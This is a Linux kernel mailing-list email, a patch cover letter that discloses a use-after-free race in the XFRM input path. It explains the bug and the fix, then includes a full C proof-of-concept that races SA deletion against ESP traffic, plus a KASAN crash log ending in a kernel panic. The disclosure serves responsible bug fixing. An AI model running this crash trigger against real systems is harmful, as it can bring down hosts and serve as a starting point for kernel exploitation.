Received: from mail-pl1-f175.google.com (mail-pl1-f175.google.com [209.85.214.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6CC5839EF19
	for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 09:24:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787995482; cv=none; b=IOuTiin3E+iKqxQ3ia5Cm1bpb6W4VsjMOqmXnqb4FZDQELNuNIJAYXn0tksWbrgt6wMJMd9jIsJoBJKTbIErYjfdCjFUd3Nn75+gVJYPCmLgImt3gDl3+u+p0cfTPLCxV+M6Gnsz8Fr4+GtoAFRObL/kToQki0aXiVDyo3yh3So=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787995482; c=relaxed/simple;
	bh=cvGtvfOABczutzJ7V08vapuR92oZwV3jnbjWEYsaO44=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GAmS5Ko4LT+uWlQw6cYIrO1xqj0dOr8D8bxasETDSRlXHkzInSRpi/RaMFzpOTYy6uHNGxCb5VxPkkdn9uLApmzg9ulVtQCXNt9oFY2yNujXzg2i1gI0CqF/q6qGJ/E3OpICjPISPb27TK+NIXzWtTmZmnoKAd4qqapdxosTuXA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QBpnOkbV; arc=none smtp.client-ip=209.85.214.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QBpnOkbV"
Received: by mail-pl1-f175.google.com with SMTP id d9443c01a7336-2d6f55a7089so17546845ad.3
        for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 02:24:40 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787995479; x=1788600279; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=8zG7/ttDgXcHxx33Wzo1xYMk5WrgJuSN4gRahaS9UCc=;
        b=QBpnOkbVcKLs83TUeaj0+R2cFcTU554ats+Fi9Gl2poFK01JiaXkoL1XWYTwr9Mw79
         O/PB1CgiplRvCAmqI/Zf09vBcNy8yxcd0bGY0rQjMXVVTbAMCQw8SXD/QwlZ0tHJvg1J
         uvF4UM5pKee//qZ27NsfrztXn7iEP09dcwyUfQVUVC8XnZ2oX/ji5StDNT0r88UBYGzF
         sCiqqzNpAYjmTsKGu8w+rA5NJhzhk8IwwLNexhK3oMyMy6LlKgbAH+mntmnCvgEyYyQn
         6zI5TdSoV4uPNu2ehXivi5ccrSDIoXuPZEOzyx5X13K8IP/DL5NEtKiRqCb70FbEUyeg
         8j9A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787995479; x=1788600279;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=8zG7/ttDgXcHxx33Wzo1xYMk5WrgJuSN4gRahaS9UCc=;
        b=JVP8K6AkNGPrquRoSSbl0peqOF3MjRlAn72NIdQjFFAddHBjNsICqmoUTURK8mCFie
         JahoB6j7no4fAHzLrHzL4nzWPtbBelQT/cbM32xKWzzAhy9HzC8VbIxsx0tzKYNqTCYV
         F5OupjS7QrVvRJhlIl26MIbBNTQCh4xLapaXur5iW3T2xZU+F0vMvxgetJPL6oBPX/Bu
         txzDZMbgJ4Oflp36E0b3mZdhBUVMD5mWwqoDIGRr+H/aLNz3r0nlkIXjVBGTyleYyCFm
         BcX1QYOa3KbyneO44/T5508LdX5ic4AeooNoq0tVwT2E/Vzj60tHs6zpGF+jW1W5OfJ8
         cP3Q==
X-Forwarded-Encrypted: i=1; AKwUvBwJWiS17rduQ6CGTscyUmYJRg8p2QNFZkNw3Y3Hu6PojqAyCBeaExscJ5lIXKN3XFNfKn0q4m0=@vger.kernel.org
X-Gm-Message-State: AFuF++m7zfh7l0Tq1I67vlU5HOdxAirquQ5bA9fKwtwz/ixeJfPn24VC
	b8LBhVaYska6QqNjjyfLoxguJ59VtyyJQKnuV0+ofvCpElWTfai5MkExs7j6x9uSMkJu
X-Gm-Gg: AYBFou1me0y3TjY3vhv8Em4MPuKnwFQuDmvBJBmfT8BxzgPIslyEjtiqso4BrU9/Cfo
	Qvj/Gadc0dTG6ePDf68qBF2gJM3lKEnx6uc5lBVEn+HtTREImPEdmnhe8usFbz+ZqSnOHyBeI4a
	ovMotva85kyJSv3YKZAKNGr14Wi4Rooe57RhuEonYhlV1V8sVuul8IptAIxIr3EQMNK8ieWX9WN
	M/zYJZGsLy+jcQZa+/0RIZ7L83VK6lHrqQwnLV4FPlGpsB3BlJCLAkbiHhtLaIWjqdHQo/+7K9v
	6VaVmWUccYYoziSsaZ6y745Xr4kviAUFtFoJkbbX8Q8DSMMk/I8+ZTuA2w6sKRA5RSPfO4kwEzt
	jhsjvrhfpJE1+csxRMu0o2x3oO5a/eqtggglh8ApBgArVIywQKCUSlYPyTHD7gcqdHNVUfvpQbN
	FnXZVHpGc0kixFH4e8yu3Bu/cTlmxmTq1+fR/qXZQRUswqP9TOkphQGy0V6wd6DojGYe81
X-Received: by 2002:a17:902:d2cc:b0:2d6:61a1:822 with SMTP id d9443c01a7336-2d74df04c7fmr199832205ad.10.1787995479193;
        Sat, 29 Aug 2026 02:24:39 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3286fa5517fsm15522568eec.31.2026.08.29.02.24.35
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 29 Aug 2026 02:24:38 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: steffen.klassert@secunet.com,
	netdev@vger.kernel.org
Cc: herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v4 0/1] xfrm: save input state data before secpath resets
Date: Sat, 29 Aug 2026 17:24:23 +0800
Message-ID: <cover.1787994112.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/xfrm/xfrm_input.c. The attached
crash was reproduced as root in a network-namespace XFRM topology.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

xfrm_input() stores the current xfrm_state in the skb secpath while it
continues receive-side processing. Some input paths can reset that secpath
before xfrm_input() has finished dereferencing the state.

Receive callback users such as VTI and XFRM interfaces can reset the
secpath. The VTI receive path does so before checking whether the packet
crosses network namespaces, while the XFRM interface path does so only for
cross-network-namespace packets. The XFRM_MAX_DEPTH error path can also
reset the secpath before the final drop callback reads the current state's
type.

If secpath_reset() drops the last state reference while the state is
concurrently deleted, xfrm_input() can still dereference the freed state
when selecting transport_finish() or reporting the drop callback protocol.

The fix saves the state protocol before a path can reset the secpath and
uses the saved address family for transport_finish(). A larval
XFRM_STATE_ACQ state has no type, so the fix retains nexthdr as its
protocol. This preserves the existing drop-path fallback while avoiding
post-reset state dereferences without per-packet state refcounting.

Reproducer:

    make
    ./poc 180

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define SRC_IP "198.51.100.2"
#define DST_IP "198.51.100.1"
#define IF_ID 0x1u
#define REAL_SPI 0x100u
#define DUMMY_SPI_BASE 0x200u
#define DUMMY_SPI_COUNT 4u
#define SENDER_CHILDREN 8
#define PAYLOAD_LEN 1472
#define DEFAULT_RUNTIME_SEC 180

static volatile sig_atomic_t stop_flag;
static uint32_t nl_seq = 1;

static const uint8_t auth_key[32] = {
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
};

static const uint8_t enc_key[16] = {
	0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
	0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
};

static void on_signal(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(1);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[2048];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	rc = system(cmd);
	if (rc != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void best_effort_cmd(const char *fmt, ...)
{
	char cmd[2048];
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);
	if (system(cmd) < 0)
		perror("system");
}

static int open_xfrm_nl(void)
{
	int fd;
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		die("socket(NETLINK_XFRM): %s", strerror(errno));
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(NETLINK_XFRM): %s", strerror(errno));

	return fd;
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	struct rtattr *rta;

	if (NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len) > maxlen)
		die("netlink attribute overflow");

	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
}

static int xfrm_ack(int fd, uint32_t seq)
{
	char buf[8192];
	ssize_t len;
	struct nlmsghdr *nlh;

	for (;;) {
		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			struct nlmsgerr *err;

			if (nlh->nlmsg_seq != seq)
				continue;
			if (nlh->nlmsg_type != NLMSG_ERROR)
				continue;

			err = NLMSG_DATA(nlh);
			return err->error;
		}
	}
}

static int xfrm_send(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	int err;

	if (sendmsg(fd, &msg, 0) < 0)
		return -errno;
	err = xfrm_ack(fd, nlh->nlmsg_seq);
	return err;
}

static int xfrm_add_sa(int fd, uint32_t spi, uint32_t if_id)
{
	struct {
		struct nlmsghdr nlh;
		struct xfrm_usersa_info xsinfo;
		char attrs[512];
	} req;
	struct {
		struct xfrm_algo_auth hdr;
		uint8_t key[sizeof(auth_key)];
	} auth = { 0 };
	struct {
		struct xfrm_algo hdr;
		uint8_t key[sizeof(enc_key)];
	} crypt = { 0 };
	uint32_t if_id_attr = if_id;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.xsinfo));
	req.nlh.nlmsg_type = XFRM_MSG_NEWSA;
	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	req.nlh.nlmsg_seq = ++nl_seq;

	req.xsinfo.family = AF_INET;
	req.xsinfo.mode = XFRM_MODE_TRANSPORT;
	req.xsinfo.id.proto = IPPROTO_ESP;
	req.xsinfo.id.spi = htonl(spi);
	req.xsinfo.reqid = 1;
	req.xsinfo.sel.family = AF_INET;
	req.xsinfo.id.daddr.a4 = inet_addr(DST_IP);
	req.xsinfo.saddr.a4 = inet_addr(SRC_IP);
	memset(&req.xsinfo.lft, 0xff, sizeof(req.xsinfo.lft));

	strncpy(auth.hdr.alg_name, "hmac(sha256)", sizeof(auth.hdr.alg_name) - 1);
	auth.hdr.alg_key_len = sizeof(auth_key) * 8;
	auth.hdr.alg_trunc_len = 128;
	memcpy(auth.key, auth_key, sizeof(auth_key));

	strncpy(crypt.hdr.alg_name, "cbc(aes)", sizeof(crypt.hdr.alg_name) - 1);
	crypt.hdr.alg_key_len = sizeof(enc_key) * 8;
	memcpy(crypt.key, enc_key, sizeof(enc_key));

	addattr_l(&req.nlh, sizeof(req), XFRMA_ALG_AUTH_TRUNC, &auth, sizeof(auth));
	addattr_l(&req.nlh, sizeof(req), XFRMA_ALG_CRYPT, &crypt, sizeof(crypt));
	if (if_id)
		addattr_l(&req.nlh, sizeof(req), XFRMA_IF_ID, &if_id_attr,
			  sizeof(if_id_attr));

	return xfrm_send(fd, &req.nlh);
}

static int xfrm_del_sa(int fd, uint32_t spi)
{
	struct {
		struct nlmsghdr nlh;
		struct xfrm_usersa_id sa_id;
	} req;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.sa_id));
	req.nlh.nlmsg_type = XFRM_MSG_DELSA;
	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.nlh.nlmsg_seq = ++nl_seq;

	req.sa_id.family = AF_INET;
	req.sa_id.proto = IPPROTO_ESP;
	req.sa_id.spi = htonl(spi);
	req.sa_id.daddr.a4 = inet_addr(DST_IP);

	return xfrm_send(fd, &req.nlh);
}

static void cleanup_env(void)
{
	best_effort_cmd("ip netns del A >/dev/null 2>&1");
	best_effort_cmd("ip netns del B >/dev/null 2>&1");
	best_effort_cmd("ip link del vethR >/dev/null 2>&1");
	best_effort_cmd("ip xfrm state flush >/dev/null 2>&1");
	best_effort_cmd("ip xfrm policy flush >/dev/null 2>&1");
}

static void setup_env(void)
{
	best_effort_cmd("sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1");
	cleanup_env();

	run_cmd("ip netns add A");
	run_cmd("ip netns add B");
	run_cmd("ip link add vethR type veth peer name vethS");
	run_cmd("ip link set vethS netns B");
	run_cmd("ip addr add %s/24 dev vethR", DST_IP);
	run_cmd("ip link set vethR up");
	run_cmd("ip -n B addr add %s/24 dev vethS", SRC_IP);
	run_cmd("ip -n B link set lo up");
	run_cmd("ip -n B link set vethS up");
	run_cmd("ip link add xfrm0 type xfrm if_id 0x%x dev vethR", IF_ID);
	run_cmd("ip link set xfrm0 netns A");
	run_cmd("ip -n A addr add %s/32 dev xfrm0", DST_IP);
	run_cmd("ip -n A link set lo up");
	run_cmd("ip -n A link set xfrm0 up");

	run_cmd("ip xfrm state add src %s dst %s proto esp spi 0x%x reqid 1 "
		"mode transport if_id 0x%x auth-trunc 'hmac(sha256)' "
		"0x1111111111111111111111111111111111111111111111111111111111111111 128 "
		"enc 'cbc(aes)' 0x22222222222222222222222222222222",
		SRC_IP, DST_IP, REAL_SPI, IF_ID);
	run_cmd("ip xfrm policy add dir in if_id 0x%x src %s/32 dst %s/32 "
		"tmpl src %s dst %s proto esp reqid 1 mode transport",
		IF_ID, SRC_IP, DST_IP, SRC_IP, DST_IP);
	run_cmd("ip -n A xfrm policy add dir in if_id 0x%x src %s/32 dst %s/32 "
		"tmpl src %s dst %s proto esp reqid 1 mode transport",
		IF_ID, SRC_IP, DST_IP, SRC_IP, DST_IP);
	run_cmd("ip -n B xfrm state add src %s dst %s proto esp spi 0x%x reqid 1 "
		"mode transport auth-trunc 'hmac(sha256)' "
		"0x1111111111111111111111111111111111111111111111111111111111111111 128 "
		"enc 'cbc(aes)' 0x22222222222222222222222222222222",
		SRC_IP, DST_IP, REAL_SPI);
	run_cmd("ip -n B xfrm policy add dir out src %s/32 dst %s/32 tmpl "
		"src %s dst %s proto esp reqid 1 mode transport",
		SRC_IP, DST_IP, SRC_IP, DST_IP);
}

static void enter_netns(const char *name)
{
	char path[128];
	const char *base = getenv("IP_NETNS_DIR");
	int fd;

	if (!base || !*base)
		base = "/var/run/netns";
	snprintf(path, sizeof(path), "%s/%s", base, name);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open(%s): %s", path, strerror(errno));
	if (setns(fd, CLONE_NEWNET) < 0)
		die("setns(%s): %s", name, strerror(errno));
	close(fd);
}

static void sender_loop(unsigned int cpu_hint)
{
	struct sockaddr_in src = {
		.sin_family = AF_INET,
		.sin_port = htons(40000 + cpu_hint),
	};
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
		.sin_port = htons(9),
	};
	cpu_set_t set;
	uint8_t payload[PAYLOAD_LEN];
	int one = 1;
	int fd;
	ssize_t ret;

	enter_netns("B");

	CPU_ZERO(&set);
	CPU_SET(cpu_hint % 4, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("sender socket: %s", strerror(errno));
	(void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	src.sin_addr.s_addr = inet_addr(SRC_IP);
	dst.sin_addr.s_addr = inet_addr(DST_IP);
	if (bind(fd, (struct sockaddr *)&src, sizeof(src)) < 0)
		die("sender bind: %s", strerror(errno));
	if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect: %s", strerror(errno));

	memset(payload, 0x41 + (cpu_hint & 0xf), sizeof(payload));

	while (!stop_flag) {
		ret = send(fd, payload, sizeof(payload), 0);
		if (ret >= 0)
			continue;
		if (errno == EINTR)
			continue;
		if (errno == ENOBUFS || errno == EAGAIN) {
			usleep(50);
			continue;
		}
	}

	close(fd);
	_exit(0);
}

static pid_t spawn_sender(unsigned int cpu_hint)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork: %s", strerror(errno));
	if (pid == 0)
		sender_loop(cpu_hint);
	return pid;
}

static void stop_children(pid_t *pids, size_t nr)
{
	size_t i;

	for (i = 0; i < nr; i++) {
		if (pids[i] > 0)
			kill(pids[i], SIGTERM);
	}
	for (i = 0; i < nr; i++) {
		if (pids[i] > 0)
			waitpid(pids[i], NULL, 0);
	}
}

static double now_sec(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec + ts.tv_nsec / 1e9;
}

int main(int argc, char **argv)
{
	struct sigaction sa = {
		.sa_handler = on_signal,
	};
	pid_t senders[SENDER_CHILDREN] = { 0 };
	unsigned int runtime_sec = DEFAULT_RUNTIME_SEC;
	unsigned long long iters = 0;
	unsigned long long readds = 0;
	unsigned long long deletes = 0;
	unsigned int i;
	double start, last_report, deadline;
	int xfd;

	if (argc > 1) {
		runtime_sec = (unsigned int)strtoul(argv[1], NULL, 0);
		if (!runtime_sec)
			runtime_sec = DEFAULT_RUNTIME_SEC;
	}

	sigemptyset(&sa.sa_mask);
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);

	setup_env();
	xfd = open_xfrm_nl();

	for (i = 0; i < SENDER_CHILDREN; i++)
		senders[i] = spawn_sender(i);

	start = now_sec();
	last_report = start;
	deadline = start + runtime_sec;

	fprintf(stderr,
		"running for %u seconds with %u sender children, async ESP transport path\n",
		runtime_sec, SENDER_CHILDREN);

	while (!stop_flag && now_sec() < deadline) {
		int err;

		err = xfrm_del_sa(xfd, REAL_SPI);
		if (!err || err == -ESRCH)
			deletes++;

		if ((iters & 0x3f) == 0) {
			for (i = 0; i < DUMMY_SPI_COUNT; i++) {
				(void)xfrm_add_sa(xfd, DUMMY_SPI_BASE + i, IF_ID);
				(void)xfrm_del_sa(xfd, DUMMY_SPI_BASE + i);
			}
		}

		err = xfrm_add_sa(xfd, REAL_SPI, IF_ID);
		if (!err || err == -EEXIST)
			readds++;

		iters++;
		if (now_sec() - last_report >= 1.0) {
			fprintf(stderr, "iters=%llu deletes=%llu readds=%llu\n",
				iters, deletes, readds);
			last_report = now_sec();
		}
	}

	stop_flag = 1;
	stop_children(senders, SENDER_CHILDREN);
	close(xfd);

	fprintf(stderr, "final iters=%llu deletes=%llu readds=%llu\n",
		iters, deletes, readds);
	cleanup_env();
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  957.602283][    C3] Oops: general protection fault, probably for non-canonical address 0xfbd59c0000000024: 0000 [#1] SMP KASAN NOPTI
[  957.603261][    C3] KASAN: maybe wild-memory-access in range [0xdead000000000120-0xdead000000000127]
[  957.603885][    C3] CPU: 3 UID: 0 PID: 3308 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  957.604578][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  957.605417][    C3] RIP: 0010:xfrm_input_state_lookup+0x6ee/0xbb0
[  957.607153][    C3] RSP: 0018:ffffc900002d8760 EFLAGS: 00010216
[  957.607549][    C3] RAX: dffffc0000000000 RBX: ffffffff8bbc1e80 RCX: 1bd5a00000000024
[  957.608070][    C3] RDX: 1ffffffff17783d8 RSI: 1ffff110234cfae4 RDI: ffff88810fe4eca0
[  957.608581][    C3] RBP: dead000000000122 R08: 1ffff110234cfada R09: fffffbfff16350f5
[  957.609102][    C3] R10: ffffffff8b1a87af R11: 0000000000000001 R12: 0000000000000000
[  957.609635][    C3] R13: ffff88810fe4ec40 R14: ffff88810fe4ec98 R15: fffffbfff17783d9
[  957.610165][    C3] FS:  00007d7b22417740(0000) GS:ffff88811a600000(0000) knlGS:0000000000000000
[  957.610739][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  957.611171][    C3] CR2: 00007ae4fcdebd70 CR3: 00000001095ae001 CR4: 0000000000770ef0
[  957.611680][    C3] PKRU: 55555554
[  957.611922][    C3] Call Trace:
[  957.612141][    C3]  <IRQ>
[  957.613478][    C3]  xfrm_input+0x7a7/0x6f50
[  957.616880][    C3]  xfrm4_esp_rcv+0x7f/0xe0
[  957.617177][    C3]  ip_protocol_deliver_rcu+0x280/0x310
[  957.617549][    C3]  ip_local_deliver_finish+0x2c7/0x3d0
[  957.617904][    C3]  ip_local_deliver+0x2a7/0x300
[  957.620423][    C3]  ip_rcv+0x393/0x440
[  957.624573][    C3]  __netif_receive_skb_one_core+0x168/0x1b0
[  957.626984][    C3]  process_backlog+0x33c/0xf00
[  957.628857][    C3]  net_rx_action+0x4d4/0xc70
[  957.631707][    C3]  handle_softirqs+0x282/0x7d0
[  957.632713][    C3]  do_softirq.part.0+0x3f/0xa0
[  957.633041][    C3]  </IRQ>
[  957.633242][    C3]  <TASK>
[  957.633439][    C3]  __local_bh_enable_ip+0x79/0x80
[  957.634122][    C3]  __dev_queue_xmit+0xc0a/0x31d0
[  957.640097][    C3]  ip_finish_output2+0x657/0x19f0
[  957.642493][    C3]  ip_output+0x1b1/0x430
[  957.643746][    C3]  xfrm_output_resume+0x3bf7/0x6710
[  957.647765][    C3]  xfrm4_output+0x12e/0x340
[  957.649055][    C3]  ip_send_skb+0x1a7/0x200
[  957.650379][    C3]  udp_send_skb+0x719/0x1480
[  957.650679][    C3]  udp_sendmsg+0x15b4/0x2470
[  957.655598][    C3]  __sys_sendto+0x361/0x3f0
[  957.657371][    C3]  __x64_sys_sendto+0xe0/0x1c0
[  957.658374][    C3]  do_syscall_64+0x6f/0x150
[  957.658671][    C3]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  957.659068][    C3] RIP: 0033:0x7d7b224a9687
[  957.660621][    C3] RSP: 002b:00007fff90945990 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  957.661172][    C3] RAX: ffffffffffffffda RBX: 00007d7b22417740 RCX: 00007d7b224a9687
[  957.661681][    C3] RDX: 0000000000000578 RSI: 00007fff90945b60 RDI: 0000000000000004
[  957.662218][    C3] RBP: 0000000000000004 R08: 0000000000000000 R09: 0000000000000000
[  957.662726][    C3] R10: 0000000000000000 R11: 0000000000000202 R12: 00007fff90945b60
[  957.663248][    C3] R13: 0000000000000003 R14: 000056c6b7669030 R15: 0000000000000000
[  957.663795][    C3]  </TASK>
[  957.663994][    C3] Modules linked in:
[  957.664374][    C3] ---[ end trace 0000000000000000 ]---
[  957.664753][    C3] RIP: 0010:xfrm_input_state_lookup+0x6ee/0xbb0
[  957.665179][    C3] Code: 4d 8d 75 58 4c 89 f1 48 c1 e9 03 80 3c 01 00 0f 85 50 02 00 00 48 89 e9 4d 8b 65 58 48 b8 00 00 00 00 00 fc ff df 48 c1 e9 03 <80> 3c 01 00 0f 85 48 02 00 00 4c 89 65 00 4d 85 e4 74 25 48 b8 00
[  957.666458][    C3] RSP: 0018:ffffc900002d8760 EFLAGS: 00010216
[  957.666872][    C3] RAX: dffffc0000000000 RBX: ffffffff8bbc1e80 RCX: 1bd5a00000000024
[  957.667389][    C3] RDX: 1ffffffff17783d8 RSI: 1ffff110234cfae4 RDI: ffff88810fe4eca0
[  957.667937][    C3] RBP: dead000000000122 R08: 1ffff110234cfada R09: fffffbfff16350f5
[  957.668438][    C3] R10: ffffffff8b1a87af R11: 0000000000000001 R12: 0000000000000000
[  957.668968][    C3] R13: ffff88810fe4ec40 R14: ffff88810fe4ec98 R15: fffffbfff17783d9
[  957.669484][    C3] FS:  00007d7b22417740(0000) GS:ffff88811a600000(0000) knlGS:0000000000000000
[  957.670082][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  957.670508][    C3] CR2: 00007ae4fcdebd70 CR3: 00000001095ae001 CR4: 0000000000770ef0
[  957.671050][    C3] PKRU: 55555554
[  957.671287][    C3] Kernel panic - not syncing: Fatal exception in interrupt
[  957.671914][    C3] Kernel Offset: disabled
[  957.672217][    C3] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  xfrm: save input state data before secpath resets

 net/xfrm/xfrm_input.c | 11 ++++++++---
 1 file changed, 8 insertions(+), 3 deletions(-)

-- 
2.43.0
